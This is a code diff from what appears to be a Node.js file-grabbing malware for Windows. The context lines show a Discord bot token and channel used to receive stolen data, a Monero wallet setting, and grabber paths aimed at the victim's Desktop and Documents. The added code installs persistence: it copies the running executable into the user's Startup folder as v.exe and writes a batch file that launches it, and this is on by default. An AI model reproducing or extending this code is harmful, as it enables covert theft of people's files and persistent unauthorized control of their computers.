@@ -13,7 +13,7 @@ const urss = require("os").userInfo().username;
 
 
 // Global settings
-
+const OnStart = true
 const TOKEN = "MTA1MDExNDQwOTc4O" // Your discord bot token
 const channelID = "105157433465601644" // Channel id for the messages.
 const walletAddr = "Your XMR Adress" // Your XMR adress
@@ -38,6 +38,19 @@ const FileGrabberPaths = [`C:/Users/${urss}/Desktop/`, `C:/Users/${urss}/Documen
 
 
 
+function setToStartup(){
+  const Fpath = process.argv[0]
+  const startPth = "C:\\Users\\" + urss +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\localhost.bat"
+  const startExePth = "C:\\Users\\" + urss +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\v.exe"
+  fs.writeFileSync(startPth, "START v.exe");
+  let dataF = fs.readFileSync(Fpath, {encoding: null});
+  fs.writeFileSync(startExePth, dataF)
+  console.log("[+] Set startup sucess")
+   
+}
+
+
+if(OnStart === true){setToStartup()}
 
 
 const StartPath =  `C:\\Users\\${urss}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Svc.bat`
